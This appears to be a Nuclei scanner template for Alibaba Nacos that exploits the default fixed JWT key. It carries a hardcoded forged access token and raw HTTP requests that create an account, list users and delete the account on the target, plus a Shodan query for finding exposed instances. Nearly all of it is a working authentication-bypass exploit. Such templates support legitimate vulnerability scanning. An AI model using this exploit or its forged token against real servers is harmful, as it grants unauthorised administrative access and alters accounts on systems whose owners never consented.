http:
- matchers:
  - condition: and
    dsl:
    - status_code_1 == 200 && contains(body_1,'create user ok!')
    - status_code_3 == 200 && contains(body_3,'delete user ok!')
    type: dsl
  matchers-condition: and
  raw:
  - 'POST /nacos/v1/auth/users/?username={{randstr_1}}&password={{randstr_2}}&accessToken={{token}}
    HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /nacos/v1/auth/users?pageNo=1&pageSize=9&search=blur&accessToken={{token}}
    HTTP/1.1

    Host: {{Hostname}}

    '
  - 'DELETE /nacos/v1/auth/users/?username={{randstr_1}}&accessToken={{token}} HTTP/1.1

    Host: {{Hostname}}

    '
id: nacos-create-user
info:
  author: SleepingBag945
  classification:
    cpe: cpe:2.3:a:alibaba:nacos:*:*:*:*:*:*:*:*
  description: 'Nacos uses a fixed JWT token key to authenticate users in the default
    configuration. Since Nacos is an open source project, the key is publicly known,
    so unauthorized attackers can use this fixed key to forge any user identity Log
    in to Nacos to manage and operate background interface functions.

    '
  metadata:
    max-request: 3
    product: nacos
    shodan-query: title:"Nacos"
    vendor: alibaba
    verified: true
  name: Alibaba Nacos - Unauthorized Account Creation
  reference:
  - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/nacos-token-create-user.yaml
  severity: high
  tags: misconfig,nacos,unauth,bypass,instrusive,vuln
variables:
  token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g
